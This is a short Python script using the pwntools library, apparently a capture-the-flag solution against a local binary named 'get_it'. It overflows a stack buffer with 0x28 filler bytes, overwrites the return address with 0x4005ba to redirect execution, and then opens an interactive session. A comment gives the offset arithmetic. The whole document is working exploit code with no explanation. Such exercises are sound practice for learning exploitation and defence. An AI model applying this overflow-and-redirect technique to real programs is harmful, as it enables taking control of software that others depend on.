from pwn import *

target = process("./get_it")

# 0x7fffffffdce8 - 0x7fffffffdcc0

payload = b"0" * 0x28 + p64(0x4005ba)

target.sendline(payload)

target.interactive()